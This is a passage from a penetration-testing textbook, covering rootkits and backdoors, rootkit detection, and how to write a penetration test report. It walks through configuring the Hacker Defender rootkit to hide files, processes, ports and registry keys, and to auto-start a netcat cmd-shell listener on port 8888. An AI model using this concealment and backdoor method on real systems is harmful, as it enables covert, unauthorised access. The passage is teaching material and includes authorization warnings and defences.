pro-\n', b'duce amazing results. running a rootkit gives you the ability to hide files, pro-\n', b'cesses, and programs as if they were never installed on the computer. rootkits \n', b'can be used to hide files from users and even the operating system itself.\n', b'Because rootkits are so effective at hiding files, they will often be successful \n', b'at evading even the most finely tuned antivirus software. the name rootkit is \n', b'typically said to be a derivative of the words \xe2\x80\x9croot,\xe2\x80\x9d as in root-level or admin-\n', b'istrative access, and the \xe2\x80\x9ckit\xe2\x80\x9d or collection of tools that were provided by the \n', b'software package.\n', b'fIGURE 6.6\n', b'Netbus Client Software Used to Remotely Control the Target.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'136\n', b'As we already mentioned, rootkits are extremely stealthy. they can be used \n', b'for a variety of purposes including escalating privileges, recording keystrokes, \n', b'installing backdoors, and other nefarious tasks. many rootkits are able to avoid \n', b'detection because they operate at a much lower level of the operating system \n', b'itself, inside the kernel. the software that users typically interact with, func-\n', b'tions at a higher level of the system. when a piece of software like antivirus \n', b'needs to perform a particular task, it will often pass the request off to the lower \n', b'levels of the operating system to complete the task. remember, some rootkits \n', b'live deep inside the operating system. they can also work by \xe2\x80\x9chooking\xe2\x80\x9d or \n', b'intercepting these various calls between the software and operating system.\n', b'By hooking the request from a piece of software, the rootkit is able to modify \n', b'the normal response. consider the following example: assume that you want \n', b'to see what processes are running on a windows machine. to accomplish this, \n', b'most users will depress the key combination \xe2\x80\x9ccntl\xee\x80\xb1Alt\xee\x80\xb1del.\xe2\x80\x9d this will \n', b'allow the user to start the task manager and view running processes and ser-\n', b'vices. most people perform this task without thinking about it. they examine \n', b'the process list presented and move on.\n', b'while the following is a gross oversimplification, it should serve as an example \n', b'to help you understand the basics. in this case software is making a call to the \n', b'operating system and asking what processes or services are running. the oper-\n', b'ating system queries all the running programs it is aware of and returns the \n', b'list. However, if we add a rootkit to the mix, things get a little more compli-\n', b'cated. Because rootkits have the ability to intercept and modify the responses \n', b'returned by the operating system, when a user attempts to view the process list, \n', b'the rootkit can simply remove selected programs, services, and processes from \n', b'the list. this happens instantaneously and the user is not aware of any differ-\n', b'ences. the program itself is actually functioning perfectly. it is reporting exactly \n', b'what it was told by the operating system. in many senses of the word, the root-\n', b'kit is causing the operating system to lie.\n', b'it is important to point out that a rootkit is not an exploit. rootkits are some-\n', b'thing that is uploaded to a system after the system has been exploited. rootkits \n', b'are usually used to hide files or programs and maintain stealthy backdoor \n', b'access.\n', b'ALERT!\n', b'As with everything else and even more so in this case, you must be 100 percent sure \n', b'that your client authorizes the use of rootkits before you deploy them in a penetration \n', b'test. Utilizing a rootkit without authorization will be a sure way to quickly end your \n', b'career and put you behind bars. Even if you have been fully authorized to conduct a \n', b'penetration test, double and triple check that you are specifically authorized to utilize  \n', b'a rootkit.\n', b'\x0cMaintaining Access with Backdoors and Rootkits  ChApTER 6\n', b'137\n', b'hacker Defender: It Is Not What you Think\n', b'first things first; do not let the name fool you, Hacker defender is a rootkit. it \n', b'is not a way to defend hackers! Hacker defender is a full-fledged rootkit that \n', b'is relatively easy to understand and configure.\n', b'there are three main files included with Hacker defender that you must be \n', b'aware of: hxdef100.exe, hxdef100.ini, and bdcli100.exe. Although the .zip \n', b'file will include several other files, we will focus our attention on these three. \n', b'Hxdef100.exe is the executable file that runs Hacker defender on the target \n', b'machine. Hxdef100.ini is the configuration file where we set up the options \n', b'we want to use and list the programs, files, or services that we want to hide. \n', b'Bdcli100.exe is the client software that is used to connect directly to Hacker \n', b'defender\xe2\x80\x99s backdoor.\n', b'once you have uploaded the hsdef100.zip file to your target, you will need to \n', b'unzip it. to keep things as simple as possible, it is best to create a single folder \n', b'on the root of the target drive. for the purpose of this example, we will create \n', b'a folder on the c:\\ drive called \xe2\x80\x9crk\xe2\x80\x9d (for rootkit). All the files including the \n', b'hxdef100.zip and its uncompressed contents are placed into this single folder. \n', b'this will make it easier to keep track of the files, provide a central location \n', b'to upload additional tools to, and make hiding this central repository much \n', b'easier. once you have unzipped the hxdef100 file, you can begin configuring \n', b'Hacker defender by modifying the hxdef100.ini file.\n', b'once you open the .ini file, you will see a number of different sections. each \n', b'major section begins with a name enclosed in a square bracket. figure 6.7 \n', b'shows an example of the default configuration file.\n', b'fIGURE 6.7\n', b'Screenshot of the hxdef100.ini Configuration File.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'138\n', b'As you can see in figure 6.7, there are several headings including [Hidden \n', b'table], [Hidden Processes], [root Processes], [Hidden services], and others. \n', b'You will also notice that Hacker defender configuration file includes a cou-\n', b'ple of default entries. these entries are used to hide the Hacker defender files \n', b'and built in backdoor so you do not have to modify these or make additional \n', b'changes. notice too that the .ini file supports the use of wildcards with the \xe2\x80\x9c*\xe2\x80\x9d \n', b'character. in this case, any file that starts with the letters hxdef will automati-\n', b'cally be included in the list.\n', b'start at the top and work your way through each of the headings. the first sec-\n', b'tion is titled [Hidden table]. Any files, directories, or folders listed under this \n', b'heading will be hidden from the explorer and file manager used by windows. \n', b'if you created a folder on the root of the drive as suggested earlier, be sure \n', b'to list it here. Building off of this previous example, we will list \xe2\x80\x9crk\xe2\x80\x9d in the \n', b'[Hidden table] section.\n', b'in the [Hidden Processes] section, you list each of the processes or programs \n', b'you want to be concealed from the user. each of the processes listed here will \n', b'be hidden from the local user when they view currently running processes with \n', b'the task manager. As a nonmalicious example assume you want to hide the cal-\n', b'culator program. in this case you will need to list the calculator program under \n', b'the [Hidden Processes] section. By adding calc.exe to the [Hidden Processes] \n', b'section, the user will no longer be able to find or interact with the calculator \n', b'program. once our rootkit is started, as far as the user is concerned, there is no \n', b'calculator program available on the computer.\n', b'the [root Processes] section is used to allow programs to interact with and \n', b'view the previously hidden folders and processes. remember that in the pre-\n', b'vious sections we were removing the computer\xe2\x80\x99s ability to detect, see, and \n', b'interact with various files and programs. in this section, we list any programs \n', b'that we want to have full control. Any programs listed here will be allowed to \n', b'view and interact with programs on the system, including those listed in the \n', b'[Hidden table] and [Hidden Processes] tab.\n', b'if you have any programs that will install as a service or run services like ftP, \n', b'web servers, backdoors, etc., you will need to list them in the [Hidden services] \n', b'section. like each of the other sections, the [Hidden services] section will hide \n', b'each of the listed services. Again, when interacting with the task manager, any \n', b'program listed here will be concealed from the \xe2\x80\x9cservices\xe2\x80\x9d list.\n', b'You can use the [Hidden regkeys] to hide specific registry keys. Almost all pro-\n', b'grams create registry keys when they are installed or run on a computer. the \n', b'[Hidden regkeys] section can be used to camouflage each of these keys. You \n', b'will need to make sure that you list them all in order to avoid detection.\n', b'some instances require more granular control than simply hiding the entire \n', b'key. if an entire key is missing (or hidden), a keen system administrator may \n', b'get suspicious. to handle these instances, Hacker defender allows us to use \n', b'\x0cMaintaining Access with Backdoors and Rootkits  ChApTER 6\n', b'139\n', b'the [Hidden regValues]. entering information here will hide individual values \n', b'rather than the entire key.\n', b'the [startup run] is a list of programs that will be automatically run once \n', b'Hacker defender has been started. this would be a good place to list the \n', b'netcat command if you were interested in creating a backdoor. Just make sure \n', b'you put it in listener mode!\n', b'Just as installing programs on a windows machine automatically creates regis-\n', b'try keys and values, installing programs onto a target requires disk drive space. \n', b'Here again, a cunning administrator may notice if you install a program that \n', b'requires lot of disk space. if a user starts his or her computer one morning and \n', b'discovers that over half of the hard drive space is suddenly in use, he or she \n', b'will probably become suspicious. You can use the [free space] section to force \n', b'the computer to \xe2\x80\x9cadd back\xe2\x80\x9d the amount of free space that you used. entering \n', b'a number here will force the computer to report the actual available free space \n', b'plus the number you enter in this section. in other words, if you install a pro-\n', b'gram that requires 1 gB of free space, you should add 1073741824 under the \n', b'[free space] heading. doing so will lessen the likelihood of discovery. Please \n', b'note, this number is listed in bytes. if you need help in converting from bytes \n', b'to kilobytes to megabytes to gigabytes, there are several good calculators avail-\n', b'able online. simply google \xe2\x80\x9ckilobytes to megabytes calculator\xe2\x80\x9d and use one of \n', b'the suggested pages returned.\n', b'if you know of ports that you plan to open, you can list them under the \n', b'[Hidden Ports] section. You will notice this section is further divided with the \n', b'following entries: tcPi:, tcPo, UdP. the \xe2\x80\x9ctcPi:\xe2\x80\x9d subsection is where you list \n', b'any inbound ports that you want hidden. if you have multiple ports to list, \n', b'simply separate them by a comma. \xe2\x80\x9ctcPo:\xe2\x80\x9d is a section where you list any out-\n', b'bound tcP ports that you want to be hidden from the user. the \xe2\x80\x9cUdP:\xe2\x80\x9d sec-\n', b'tion is used to specify any UdP ports that you want concealed.\n', b'now that you have an idea of how to configure the basic Hacker defender  \n', b'settings, let us examine the tool in action. for this example, we will install \n', b'Hacker defender in a folder on the c:\\ drive called \xe2\x80\x9crk.\xe2\x80\x9d we will also place a \n', b'copy of netcat into this folder. figure 6.8 shows an example of the .ini configu-\n', b'ration file.\n', b'You will notice that only a few extra lines have been added to the default  \n', b'configuration file. in this example, we have added the \xe2\x80\x9crk\xe2\x80\x9d folder to the \n', b'[Hidden table] section, the netcat executable to the [Hidden Processes] sec-\n', b'tion, and lastly set up netcat to automatically start up in server mode and  \n', b'provide a cmd shell on port 8888 of the target. if you wanted to add an  \n', b'additional layer of stealth, you could also add 8888 to the [Hidden Ports] \n', b'section.\n', b'figure 6.9 shows two screenshots prior to starting Hacker defender. notice that \n', b'both the \xe2\x80\x9crk\xe2\x80\x9d folder and the netcat (nc.exe) program are visible.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'140\n', b'However, once the hxdef100.exe file has been executed, the rootkit is in full \n', b'force. figure 6.10 demonstrates that neither the \xe2\x80\x9crk\xe2\x80\x9d folder nor the \xe2\x80\x9cnc.exe\xe2\x80\x9d \n', b'program is visible to the user.\n', b'As you can see, even a simple rootkit like Hacker defender is quite capable of \n', b'masking and hiding files. rootkits are a vast topic and we could easily dedicate \n', b'fIGURE 6.9\n', b'Prior to Running the Rootkit Both Folder and Program Are Visible.\n', b'fIGURE 6.8\n', b'Newly Configured hxdef100.ini File.\n', b'\x0cMaintaining Access with Backdoors and Rootkits  ChApTER 6\n', b'141\n', b'an entire book to the technical details and their makeup and inner workings. \n', b'rootkit technology, like all malware, continues to develop at a staggering pace. \n', b'in order to truly master rootkits you will need to begin with a solid under-\n', b'standing of the operating system kernel. once you finish covering the basics, \n', b'you are highly encouraged to dive into the malware rabbit hole and see just \n', b'how deep it goes.\n', b'DETECTING AND DEfENDING AGAINST ROOTKITS\n', b'let us break from the normal convention of this book and take a minute to \n', b'discuss a few defensive strategies for dealing with rootkits. Because we are \n', b'focusing on the basics, defending against many of the techniques covered in \n', b'the earlier step has been quite simple:\n', b'n closely monitor the information you put onto the internet.\n', b'n Properly configure your firewall and other access control lists.\n', b'n Patch your systems.\n', b'n install and use antivirus software.\n', b'n make use of an intrusion detection system.\n', b'Although the list is not nearly complete, it is a good starting point for defend-\n', b'ing systems. However, even with all of those processes in place, rootkits can \n', b'still pose a danger.\n', b'defending against and detecting rootkits takes a few extra steps. it is impor-\n', b'tant to understand that in order to configure and install a rootkit, adminis-\n', b'trative access is required. so the first step in avoiding rootkits is to deprivilege \n', b'your users. it is not uncommon to find networks that are loaded with windows \n', b'fIGURE 6.10\n', b'After Running the Rootkit Both Folder and Program Are Invisible.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'142\n', b'machines where every user is a member of the administrator group. Usually \n', b'when inquiring as to why every user is an administrator, the system admins sim-\n', b'ply just shrug or provide some lame excuse about the user needing to be admin-\n', b'istrators to run a particular piece of software. really? come on, this is not 1998. \n', b'there are very few legitimate reasons for allowing your users to run around with \n', b'full admin rights. with most modern operating systems, you have the ability to \n', b'temporarily elevate your privileges with the \xe2\x80\x9csu\xe2\x80\x9d or \xe2\x80\x9crun As\xe2\x80\x9d commands.\n', b'Although it is true that many rootkits function at the kernel level and have the \n', b'ability to avoid detection by antivirus software, installing, using, and keeping the \n', b'software up-to-date is critical. some rootkits, especially the older and less sophis-\n', b'ticated versions can be detected and cleaned by modern antivirus software.\n', b'monitor the traffic coming into and going out of your network. many adminis-\n', b'trators are great at monitoring and blocking traffic as it flows into the network. \n', b'they spend days and even weeks honing their rule sets to block incoming traf-\n', b'fic. At the same time, many of these admins completely ignore all outbound \n', b'traffic. they become so focused on the incoming traffic that they forget to \n', b'watch what is leaving. monitoring outbound traffic can be vital in detecting \n', b'rootkits and other malware.\n', b'Another good tactic for detecting rootkits and backdoors is to regularly port \n', b'scans your systems. make note of each open port on each of your systems. if \n', b'you find a system with an unknown port open, be sure to track down the Pc \n', b'and identify the rogue service.\n', b'tools like rootkit revealer, Vice, and f-secure\xe2\x80\x99s Blacklight are some great free \n', b'options for revealing the presence of hidden files and rootkits. Unfortunately, \n', b'once a rootkit has been installed, it can be very difficult to remove, or at least \n', b'to remove completely. sometimes, rootkit removal requires you to boot your \n', b'machine into an alternate operating system and mount your original hard \n', b'drive. By booting your machine to an alternate operating system or mounting \n', b'the drive to another machine, you can scan the drive more thoroughly. Because \n', b'the original operating system will not be running and your scanner will not be \n', b'using APi calls to an infected system, it is more likely you will be able to dis-\n', b'cover and remove the rootkit. even with all of this, oftentimes your best bet is \n', b'to simply wipe the system, including a full format, and start over.\n', b'hOW DO I pRACTICE ThIS STEp?\n', b'like each of the steps that have been discussed, becoming proficient with \n', b'backdoors and rootkits requires practice. working with tools like netcat can \n', b'seem a bit confusing at first, especially when we use the \xe2\x80\x9c-e\xe2\x80\x9d switch to provide \n', b'backdoor functionality. the best way to practice this technique is to set up two \n', b'machines and practice implementing netcat between them. the more you use \n', b'netcat, the more comfortable you will become with the concept.\n', b'You should practice both sending and receiving files from each machine. it \n', b'is important to understand directionality and exactly how to use netcat to \n', b'\x0cMaintaining Access with Backdoors and Rootkits  ChApTER 6\n', b'143\n', b'perform this task both ways (download and uploading). once the basics of \n', b'sending and receiving files have been mastered, begin focusing on using netcat \n', b'as a backdoor. remember the \xe2\x80\x9c-e\xe2\x80\x9d switch is vital in performing this task. fully \n', b'understanding how to implement netcat as a backdoor will require setting up \n', b'the tool in listener mode on the target and making a connection to it from the \n', b'attacker machine.\n', b'Be sure to practice setting up a backdoor and establishing a connection with \n', b'both linux and windows. it is important to master the difference between the \n', b'linux and windows versions. remember, a windows netcat version can con-\n', b'nect to a linux version and vice versa; however, there are several minor differ-\n', b'ences in the switches and functionality of each program.\n', b'finally, after becoming proficient with the basics of netcat, be sure to explore \n', b'some advanced features like using netcat as a proxy, reverse shells, port scan-\n', b'ning, creating and copying a disk partition image, and chaining netcat instances \n', b'together to bounce traffic from one machine to another.\n', b'Before wrapping up netcat, be sure to thoroughly review the \xe2\x80\x9cman\xe2\x80\x9d pages and \n', b'examine each switch. Again, you will want to look closely at the differences \n', b'between the linux and windows versions. examining the switches and reading \n', b'the \xe2\x80\x9cman\xe2\x80\x9d pages often provides additional information and can spur some cre-\n', b'ative uses of the tool.\n', b'Practicing with rootkits can be a bit of a double-edged sword. exploring and \n', b'learning to use rootkits can be rewarding and valuable but as with all malware \n', b'there is certainly some risk involved. Anytime malware is used or studied, there \n', b'is a chance that the malware will escape or infect the host system. readers are \n', b'strongly encouraged to exercise extreme caution before downloading or install-\n', b'ing any type of malware. Advanced malware and rootkit analysis is beyond the \n', b'scope of this book and is not recommended.\n', b'if you are still compelled to study these topics, the use of a sandboxed envi-\n', b'ronment and virtual machines is a must. Always disconnect all outside access \n', b'before proceeding to ensure that nothing escapes your network. remember \n', b'that you are legally responsible for any and all traffic that leaves your network. \n', b'the laws that govern computer use at the federal and state levels make no dis-\n', b'tinction between traffic that \xe2\x80\x9caccidentally\xe2\x80\x9d leaves your network and traffic that \n', b'is sent on purpose.\n', b'in reality, rootkits and backdoors are rarely used in a penetration test. it is \n', b'highly suggested that you focus on mastering each of the other steps before \n', b'attempting to advance any further with malware.\n', b'WhERE DO I GO fROM hERE?\n', b'After mastering the basics of backdoors and rootkits, you should expand your \n', b'horizon by exploring similar tools including ncat and socat. ncat is a modern-\n', b'ized version of the original netcat tool and is included as part of the nmap \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'144\n', b'project. ncat improves on the original tool by including many of the original \n', b'features plus ssl and iPv6 support. socat is another close netcat relative that \n', b'is great for reading and writing network traffic. socat also extends the origi-\n', b'nal functionality of netcat by adding support for ssl, iPv6, and several other \n', b'advanced features.\n', b'if you are interested in learning more about backdoors, you should spend time \n', b'exploring a couple of classic examples including Back orifice and subseven \n', b'(sub7). Back orifice is similar in nature to netbus and allows a user to com-\n', b'mand and control a remote machine. the program was originally released \n', b'by sir dystic in 1998. You can listen to the original talk titled \xe2\x80\x9ccult of the \n', b'dead cow: the announcement of Back orfice, directxploit, and the modular \n', b'ButtPlugins for Bo\xe2\x80\x9d by reviewing the defcon 6 media archives.\n', b'sub7 was originally released in 1999 by mobman and functions in a client/\n', b'server manner similar to netbus and Back orifice. like each of the other tools \n', b'discussed in this chapter, sub7 is software that allows a client to remotely con-\n', b'trol a server. one interesting point about sub7 is the fact that after a six-year \n', b'hiatus, where no development occurred, the project was revived and updated.\n', b'if you are interested in expanding your knowledge of rootkits, it is important \n', b'to study and master the inner workings of modern operating systems. learning \n', b'the intricate details of an operating system kernel may seem daunting at first, \n', b'but it is well worth your time.\n', b'this chapter examined the Hacker defender rootkit and provided a basic over-\n', b'view of the functionality and use of rootkits. it is important to understand that \n', b'this material only scratches the surface of rootkits. Advanced topics include \n', b'hooking system and function calls and understanding the difference between \n', b'user-mode and kernel-mode kits. developing a solid grasp of system program-\n', b'ming and programming languages can be extremely beneficial as well.\n', b'SUMMARy\n', b'this chapter focused on the use and implementation of backdoors and root-\n', b'kits. remember it is vital that you have proper authorization before utilizing \n', b'a rootkit or backdoor in a penetration test. this chapter began by introduc-\n', b'ing the powerful and flexible tool netcat. several uses of netcat, including \n', b'implementing netcat as a backdoor, are covered. cryptcat, a modern version \n', b'of netcat with the added ability to encrypt traffic between two machines, was \n', b'also discussed. the classic remote control program netbus was introduced to \n', b'demonstrate the power of \xe2\x80\x9ccommand and control\xe2\x80\x9d software. the chapter con-\n', b'cluded with a brief overview of rootkits including their basic structure and use. \n', b'specifically, the proper use, configuration, and implementation of the Hacker \n', b'defender rootkit was covered.\n', b'\x0c145\n', b'INTRODUCTION\n', b'many people assume that once you have completed each of the four steps out-\n', b'lined in chapters 2\xe2\x80\x936 on your target, the penetration test is over. many new-\n', b'comers also assume that immediately following step 4, you can simply call the \n', b'client to discuss your findings or maybe even just send the client a bill for your \n', b'services. Unfortunately, that is not the case. the reality is that once you wrap \n', b'up the technical details of a penetration test, there is still one task remaining. \n', b'After all of the reconnaissance, scanning, exploitation, and maintaining access \n', b'is complete, you need to summarize your findings in the form of a penetration \n', b'testing report.\n', b'it is not uncommon to find extremely gifted hackers and penetration testers \n', b'who want to completely ignore this phase. these people have the skill and the \n', b'ability to compromise nearly any network, but they lack the skills to commu-\n', b'nicate the vulnerabilities, exploits, and mitigations to the client.\n', b'in many respects, writing the penetration testing report is one of the most criti-\n', b'cal tasks that an ethical hacker performs. it is important to remember that in \n', b'many cases, the better you do your job as a penetration tester, the less your cli-\n', b'ent will actually notice or \xe2\x80\x9cfeel\xe2\x80\x9d your work. As a result, the final report is often \n', b'the only tangible evidence that a client will receive from the penetration tester \n', b'and the Pt process.\n', b'Wrapping Up the \n', b'penetration Test\n', b'ChApTER 7\n', b'Information in This Chapter:\n', b'n Writing the Penetration Testing Report\n', b'n You Do Not Have to Go Home But You Cannot Stay Here\n', b'n Where Do I Go From Here?\n', b'n Wrap Up\n', b'n The Circle of Life\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'146\n', b'the penetration testing report often becomes the face of your organization \n', b'and reputation. once the initial contract has been signed providing scope and \n', b'authorization, the penetration tester often disappears from the target organiza-\n', b'tion. the test itself occurs in a relatively isolated environment. once the test is \n', b'completed, it is critical that the penetration tester present his or her findings \n', b'in a well thought-out, organized, and easy-to-understand manner. Again, it is \n', b'important to remember that in most cases the target organization (the com-\n', b'pany that is paying you) has no concept of what you have been doing or how \n', b'many hours you have put into the task. As a result, the penetration testing \n', b'report becomes the principal reflection of your competence. You have a respon-\n', b'sibility to the client to present your findings, but you also have an opportunity \n', b'to showcase your talent and explain how you spent the client\xe2\x80\x99s time and money \n', b'wisely.\n', b'do not underestimate the power or importance of this phase. in reality often-\n', b'times your perceived efforts and success will be judged based more on your \n', b'report than your actual success or failure to compromise a network. Ultimately, \n', b'the ability to write a good penetration testing report will win you repeat \n', b'business.\n', b'WRITING ThE pENETRATION TESTING REpORT\n', b'like every other topic we have discussed, writing a good penetration test-\n', b'ing report takes practice. many penetration testers mistakenly think that they \n', b'can simply provide the raw output from the tools that they run. this group of \n', b'people will often collect and neatly organize the various outputs into a single \n', b'report. they will gather any pertinent information from the reconnaissance \n', b'phase and include it along with the output from nmap and nessus.\n', b'many of the tools we discussed in this book include a reporting engine. for \n', b'example, nessus has several prebuilt reports that can be generated based off of \n', b'the scan. Unfortunately, using the prebuilt reports is not enough. each report \n', b'must be well laid out and flow as a single document. combining one style of \n', b'report from nessus with a different style of report from nmap or metasploit \n', b'will make the penetration test report appear disjointed and unorganized.\n', b'with that being said, it is important to provide the detailed output from each \n', b'of your tools. not many of your clients will have the ability to understand the \n', b'technical output from nmap or nessus; however, remember the data does \n', b'belong to the client and it is important that they have access to the raw data.\n', b'we have covered several examples of what not to do in a penetration test-\n', b'ing report; let us look at it from a different angle and discuss what should \n', b'be done.\n', b'first and foremost, the penetration testing report needs to be broken into \n', b'several individual pieces. taken together, these pieces will form your overall \n', b'report, but each piece should work as a stand-alone report as well.\n', b'\x0cWrapping Up the penetration Test ChApTER 7\n', b'147\n', b'At a minimum, a well-rounded and presented penetration testing report should \n', b'include the following:\n', b'1. An executive summary\n', b'2. A detailed report\n', b'3. raw output\n', b'Executive Summary\n', b'the executive summary should be a very brief overview of your major findings. \n', b'this document, or subreport, should not exceed two pages in length and only \n', b'include the highlights of the penetration test. the executive summary does not \n', b'provide technical details or terminology. this report needs to be written in the \n', b'context of board members and nontechnical management so that they can \n', b'understand your findings and any major concerns you discovered on the net-\n', b'work and systems.\n', b'if vulnerability and exploits were discovered, the executive summary needs \n', b'to focus on explaining how these findings impact the business. the executive \n', b'summary should provide links and references to the detailed report so that \n', b'interested parties can review the technical nature of the findings. it is impor-\n', b'tant to remember that the executive summary must be very brief and written \n', b'at a high level. most executive summaries should be written in such a way that \n', b'that the report writer\xe2\x80\x99s own grandmother would be able to understand what \n', b'occurred during the penetration test and what the major findings were.\n', b'Detailed Report\n', b'the second part in a well-rounded penetration testing report is the detailed \n', b'report. this report will include a comprehensive list of your findings as well \n', b'as the technical details. the audience for this report includes it managers, \n', b'security experts, network administrators, and others who possess the skills \n', b'and knowledge required to read and comprehend its technical nature. in most \n', b'cases, this report will be used by the technical staff to understand the details of \n', b'what your test uncovered and how to address or fix these issues.\n', b'As with every facet of the penetration test, it is important to be honest and \n', b'direct with the client. Although it may be tempting to emphasize your great \n', b'technical savvy and discuss how you owned a particular service, it is much more \n', b'important to present the facts to your client beginning with the issues that pose \n', b'the most danger to their networks and systems. ranking the discovered vulnera-\n', b'bilities can be confusing and daunting for a new penetration tester, luckily most \n', b'tools like nessus will provide you with a default ranking system. Always present \n', b'critical findings first. this makes your penetration test easier to read and allows \n', b'the client to read about and take action on the most serious findings first (with-\n', b'out having to dig through 50 pages of technical output).\n', b'Because it is important it needs to be stated again, it is imperative that you put \n', b'the needs of the client before your ego. consider the following example: assume \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'148\n', b'you are conducting a penetration test and are able to fully compromise a server \n', b'on your target\xe2\x80\x99s network. However, after further investigation and review, you \n', b'determine that the newly compromised system is of no value. that is, it holds \n', b'no data, is not connected to any other systems, and cannot be used to gain \n', b'further access to the network. later in the penetration test, one of your tools \n', b'reports a critical vulnerability on a boarder router. Unfortunately, even after \n', b'having read the details of the vulnerability and running several tools, you are \n', b'unable to exploit the weakness and gain access to the system. even though you \n', b'are unable to gain access to the boarder router, you are certain that the system \n', b'is vulnerable. You also know that because this device is a boarder router, if it is \n', b'compromised the entire network will be at risk.\n', b'of course it should go without saying that in this example both of these flaws \n', b'should be reported. However, the point is that in this case one flaw clearly \n', b'presents more danger than the other. in this situation, many newcomers may \n', b'be tempted to showcase their technical skills and successes by emphasizing \n', b'the fact that they were able to successfully compromise a server and downplay \n', b'the importance of the critical vulnerability because the penetration tester was \n', b'unable to exploit it. never put yourself or your ego above the security of your \n', b'clients. do not overstate the facts; simply report your findings to the best of your \n', b'ability in an objective manner. let them make subjective decisions with the data \n', b'you provide. never make up or falsify data in a penetration test. never reuse \n', b'\xe2\x80\x9cproof-of-concept\xe2\x80\x9d screenshots. it can be tempting to take shortcuts by supply-\n', b'ing generic, reusable proofs, but it is a dangerous and unethical thing to do.\n', b'the idea and use of proof-of-concept screenshots is a powerful tool and should \n', b'be incorporated into the penetration testing report whenever possible. Anytime \n', b'you discover a major finding or successfully complete an exploit, you should \n', b'include a screenshot in the detailed report. this will serve as undeniable evi-\n', b'dence and provide the reader with a visualization of your success.\n', b'it is also good to remember, especially when you first start conducting penetra-\n', b'tion tests, that not every Pt will result in a \xe2\x80\x9cwin\xe2\x80\x9d or the successful compromise \n', b'of your target. in most situations, the penetration test is bound by some artifi-\n', b'cial rules that reduce the reality of the test. these include the demands imposed \n', b'by the client such as scope, time, and budget as well as the legal and ethical \n', b'restrictions that help define the boundaries of a penetration test. As you prog-\n', b'ress in your penetration testing career, you will undoubtedly encounter situa-\n', b'tions where your penetration test turns up completely blank, no vulnerabilities, \n', b'no weaknesses, no useful information gathered, etc. in these situations, you \n', b'still need to complete the penetration testing report. in these situations, the raw \n', b'tool output will provide the bulk of your report.\n', b'whenever possible, when writing the detailed penetration testing report, you \n', b'should include mitigations and suggestions for addressing the issues you dis-\n', b'covered. some tools, like nessus, will provide suggested mitigations. if your \n', b'tools do not provide precanned mitigations, then it is important that you \n', b'locate potential solutions on your own. if you are unsure of where to look for \n', b'\x0cWrapping Up the penetration Test ChApTER 7\n', b'149\n', b'these solutions, most public exploits and vulnerabilities include details or steps \n', b'that can be taken to address the weakness. Use google and the internet to track \n', b'down specifics of the reported weaknesses. By reviewing the technical details of \n', b'a vulnerability, you will often find potential solutions. these typically include \n', b'downloading a patch or upgrading to a newer version of the software, although \n', b'they may discuss other resolutions such as configuration changes or hardware \n', b'upgrades.\n', b'Providing solutions to each of the problems you discover is a vital part of the \n', b'detailed report. it will also serve to win you repeat business and help to distin-\n', b'guish yourself from other penetration testers.\n', b'the findings in the detailed report should also include links and references to \n', b'specific pages in the raw output section. this is important because it will save \n', b'you time and confused phone calls from your clients who are wondering how \n', b'you discovered a particular issue. Providing clear references to the raw tool out-\n', b'put will allow the client to dig into the details without needing to contact you. \n', b'in this manner, you should be able to see how the report flows from executive \n', b'summary to detailed summary to raw output.\n', b'Raw Output\n', b'the final portion of the report should be the technical details and raw out-\n', b'put from each of the tools. in reality, not every penetration tester will agree \n', b'that this information needs to be included with the penetration testing report. \n', b'there is some merit to the arguments against including this detailed informa-\n', b'tion, which includes the fact that this information is often hundreds of pages \n', b'in length and can be very difficult to read and review. Another common argu-\n', b'ment often repeated from fellow penetration testers is that providing this level \n', b'of detail is unnecessary and allows the client to see exactly what tools were run \n', b'to perform the penetration test.\n', b'if you are using custom tools, scripts, or other proprietary code to perform a \n', b'penetration test, you may not want to reveal this type of information directly \n', b'to your client. However, in most cases, it is usually safe to provide the direct \n', b'output of the tools used in the penetration test. this is not to say that you need \n', b'to provide the detailed commands and switches that were used to run tools \n', b'like metasploit, nmap, or custom code, but rather that you make the output of \n', b'those commands available. if you are concerned about disclosing the specific \n', b'commands used to run your tools, you may have to sanitize the raw output to \n', b'remove those commands and manually delete any other sensitive information \n', b'you do not want to be disclosed to the readers.\n', b'from the view point of a basic penetration test, which typically includes each \n', b'of the tools we discussed in this book, it would not be out of the question \n', b'to simply include all the raw output at the end of the report. the reason for \n', b'this is simple\xe2\x80\x94the tools and commands used to invoke each of the tools in a \n', b'basic penetration test are widely known and available. there is no real point in \n', b'hiding or attempting to obfuscate this information. Additionally, as mentioned \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'150\n', b'earlier, including the detailed output and making clear references to it in the \n', b'detailed report will often save you time and phone calls from frustrated clients \n', b'who do not understand your findings.\n', b'whether you decide to include the raw data as an actual component of the \n', b'report or you decide to include it as a separate document is entirely up to you. \n', b'depending on the sheer size of this report, you may want to simply include it \n', b'as a secondary or stand-alone report and not attach it directly with the execu-\n', b'tive summary and the detailed reports.\n', b'Another consideration that needs to be given some careful thought is how \n', b'you will present your report to the client. this is something that should be \n', b'discussed prior to the delivery of the report. from a purely time-management \n', b'and resource standpoint, it is often easiest to deliver the report as an electronic \n', b'document. in the case where the client requests a paper copy, you will need to \n', b'professionally print, bind, and mail the document to the client. Be sure to send \n', b'the document via certified mail and always request a return receipt so you can \n', b'verify that the document was properly received.\n', b'if you have agreed to deliver the document electronically, you will need to \n', b'ensure that the penetration testing report is encrypted and remains confiden-\n', b'tial until it arrives in the client\xe2\x80\x99s hands. remember a penetration testing report \n', b'often contains very sensitive information about the organization. You must \n', b'ensure the information contained in the report remains private. it would be \n', b'very embarrassing to have a report you created become public because you did \n', b'not take the basic measures needed to ensure confidentiality.\n', b'there are several easy ways of ensuring confidentiality. You can use a tool \n', b'like 7zip to compress and add a password to the files. A much better way of \n', b'encrypting a document is to use a tool like truecrypt to encrypt the docu-\n', b'ments. truecrypt is an easy-to-use program and can be downloaded for free \n', b'from: http://www.truecrypt.org. regardless of what type of encryption or pro-\n', b'tection scheme you use, your client will need to use the same tool to decrypt \n', b'and view the files. this is an arrangement that should be agreed upon before \n', b'the penetration test begins. some of your clients may not understand even the \n', b'basics of cryptography. As a result, you may need to work with and train them \n', b'on the proper techniques needed to view your final report.\n', b'each section or individual subreport should be clearly labeled and should \n', b'begin on 